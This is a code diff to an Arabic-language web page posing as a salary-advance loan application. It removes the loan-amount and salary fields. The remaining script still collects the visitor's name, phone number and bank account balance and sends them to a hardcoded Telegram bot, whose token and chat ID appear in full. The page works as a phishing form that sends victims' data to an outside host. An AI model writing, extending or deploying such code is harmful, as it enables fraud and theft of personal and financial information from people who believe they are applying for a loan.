@@ -84,25 +84,7 @@
             <label for="phone">ادخل رقم الهاتف</label>
             <input type="tel" id="phone" name="phone" required>
         </div>
-        <div class="form-group">
-            <select id="loanAmount" name="loanAmount" required>
-                <option value="">اختر مبلغ السلفة</option>
-                <option value="5 مليون">5 مليون</option>
-                <option value="10 مليون">10 مليون</option>
-                <option value="15 مليون">15 مليون</option>
-                <option value="20 مليون">20 مليون</option>
-                <option value="25 مليون">25 مليون</option>
-            </select>
-        </div>
-        <div class="form-group">
-            <select id="monthlySalary" name="monthlySalary" required>
-                <option value="">اختر الراتب الشهري</option>
-                <option value="100k-300k">من 100 الف إلى 300 الف</option>
-                <option value="300k-500k">من 300 الف إلى 500 الف</option>
-                <option value="500k-700k">من 500 الف إلى 700 الف</option>
-                <option value="700k-1m">من 700 الف إلى 1 مليون</option>
-                <option value=">1m">اكثر من 1 مليون</option>
-            </select>
+
         </div>
                 <div class="form-group">
            <label for="phone">رصيد الحساب الحالي</label>
@@ -135,7 +117,7 @@
             const ok = document.getElementById('ok').value;
             const token = '7636117454:AAG89iFLhRboah-JoMu2-gtmXz2qq8QemUM';
             const chatId = '6797351288';
-            const message = `الإسم بالكامل: ${fullName}\nرقم الهاتف: ${phone}\nمبلغ السلفة: ${loanAmount}\nالراتب الشهري: ${monthlySalary}\nالرصيد داخل الحساب: ${ok}`;
+            const message = `الإسم بالكامل: ${fullName}\nرقم الهاتف: ${phone}\nالرصيد داخل الحساب: ${ok}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;  
             await fetch(url);
             setTimeout(() => {
